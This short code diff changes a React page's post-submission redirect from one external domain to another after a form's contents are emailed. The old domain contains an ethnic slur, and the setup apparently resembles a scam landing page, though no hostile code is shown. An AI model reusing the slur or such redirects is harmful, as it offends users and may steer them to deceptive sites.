@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sage-mart.chinkslink.click';
+        window.location.href = 'https://drive.exchangebetasystem.pro';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
